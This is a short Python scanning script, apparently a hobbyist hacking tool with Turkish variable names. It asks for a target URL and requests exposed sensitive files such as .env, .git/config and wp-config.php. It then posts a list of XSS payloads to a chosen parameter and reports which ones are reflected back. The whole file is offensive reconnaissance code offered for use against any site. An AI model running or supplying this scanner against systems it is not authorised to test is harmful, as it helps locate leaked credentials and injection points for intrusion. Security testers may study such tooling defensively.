import requests

banner = r"""
_________               .__                  
\_   ___ \_____    ____ |  |__   ___________ 
/    \  \/\__  \ _/ ___\|  |  \_/ __ \_  __ \
\     \____/ __ \\  \___|   Y  \  ___/|  | \/
 \______  (____  /\___  >___|  /\___  >__|   
        \/     \/     \/     \/     \/       
              !Coded by 4B2A!
              
"""
hedef = input("Target URL:")
if not hedef.startswith(("http://", "https://")):
    hedef = "https://" + hedef
hedef = hedef.rstrip("/")
print("Starting...")

hassas_dosyalar = [
    ".env",
    ".git/config",
    "robots.txt",
    "wp-config.php",
    "config.php.bak",
    "error.log",
]
for dosya in hassas_dosyalar:
    tam_adres = hedef + "/" + dosya
    try:
        cevap = requests.get(tam_adres, timeout=3)
        if cevap.status_code == 200:
            print(f"[+] Found {tam_adres}")
    except requests.exceptions.RequestException:
        pass

print("\n[+] Step 2 Start: XSS Scanner")

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<a href=javascript:alert(1)>",
]  # Listenin köşeli parantezini en solda kapattık
parametre = input("Enter parameter name (e.g., comment, id, q):")
for payload in xss_payloads:
    veri = {parametre: payload}
    try:
        xss_cevap = requests.post(hedef, data=veri, timeout=5)
        if xss_cevap.status_code == 200:
            if payload in xss_cevap.text:
                print(f"[+] Found XSS in {hedef} with {payload}")
    except requests.exceptions.RequestException:
        pass
